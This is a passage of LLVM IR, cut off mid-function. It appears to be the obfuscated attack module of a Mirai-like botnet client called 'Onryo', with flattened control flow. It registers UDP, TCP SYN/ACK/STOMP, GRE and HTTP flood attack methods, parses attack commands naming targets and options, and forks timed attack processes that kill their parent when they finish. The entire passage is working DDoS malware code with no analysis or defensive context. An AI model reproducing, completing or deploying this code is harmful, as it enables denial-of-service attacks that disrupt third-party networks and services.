; ModuleID = 'host/ir_fla/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00", align 16
@table = common global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 1219581050, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1219581050, label %2
    i32 -687178531, label %6
    i32 -363344842, label %13
    i32 -1612950036, label %19
    i32 -1929543473, label %23
    i32 1068189943, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 3
  %5 = select i1 %4, i32 -687178531, i32 1068189943
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 -363344842, i32 -1612950036
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #6
  store i32 -1612950036, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 -1929543473, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 1219581050, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 -160634142, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -160634142, label %first
    i32 -511686859, label %17
    i32 922707134, label %18
    i32 -380500703, label %32
    i32 -105652117, label %33
    i32 262952980, label %44
    i32 -84013731, label %45
    i32 -1139442831, label %57
    i32 997269203, label %58
    i32 -352770667, label %66
    i32 686223913, label %67
    i32 898998316, label %72
    i32 -1054692916, label %78
    i32 -954121265, label %120
    i32 -1354875231, label %123
    i32 904038258, label %128
    i32 -901579398, label %129
    i32 -128421449, label %141
    i32 60105251, label %146
    i32 -54076970, label %152
    i32 -1435783131, label %157
    i32 -1621732954, label %158
    i32 1448323816, label %175
    i32 -773534384, label %176
    i32 -1859701813, label %189
    i32 -518849347, label %190
    i32 -391749826, label %219
    i32 -2014075303, label %222
    i32 -347040226, label %223
    i32 -1883782500, label %231
    i32 -1122882993, label %235
    i32 -929439213, label %238
    i32 1943059735, label %242
    i32 -453675240, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 -511686859, i32 922707134
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -380500703, i32 -105652117
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 262952980, i32 -84013731
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -1139442831, i32 997269203
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -352770667, i32 686223913
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 898998316, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 -1054692916, i32 -1354875231
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -954121265, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 898998316, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 904038258, i32 -901579398
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 -128421449, i32 -347040226
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 60105251, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -54076970, i32 -2014075303
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 -1435783131, i32 -1621732954
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 1448323816, i32 -773534384
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 -1859701813, i32 -518849347
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 -391749826, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 60105251, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -347040226, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 -1883782500, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 -1122882993, i32 -929439213
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -929439213, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 1943059735, i32 -453675240
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -453675240, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1426695836, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1426695836, label %first
    i32 97714189, label %20
    i32 591969017, label %24
    i32 -814390739, label %25
    i32 -1918930773, label %30
    i32 87317894, label %31
    i32 -1475069028, label %35
    i32 -204208442, label %40
    i32 515215898, label %41
    i32 1404275, label %47
    i32 488466052, label %60
    i32 1750716180, label %72
    i32 -216055954, label %73
    i32 995600876, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
  %19 = select i1 %18, i32 591969017, i32 97714189
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %13, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = select i1 %22, i32 591969017, i32 -814390739
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @fork() #6
  store i32 %26, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
  %29 = select i1 %28, i32 -1918930773, i32 87317894
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @exit(i32 0) #8
  unreachable

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %14, align 4
  %33 = icmp eq i32 %32, 0
  %34 = select i1 %33, i32 -1475069028, i32 -204208442
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @sleep(i32 %36)
  %38 = call i32 @getppid() #6
  %39 = call i32 @kill(i32 %38, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:40:                                     ; preds = %loopEntry
  store i32 0, i32* %15, align 4
  store i32 515215898, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %15, align 4
  %43 = load i8, i8* @methods_len, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp slt i32 %42, %44
  %46 = select i1 %45, i32 1404275, i32 995600876
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %48, i64 %50
  %52 = load %struct.attack_method*, %struct.attack_method** %51, align 8
  %53 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 8
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %8, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %55, %57
  %59 = select i1 %58, i32 488466052, i32 1750716180
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %61, i64 %63
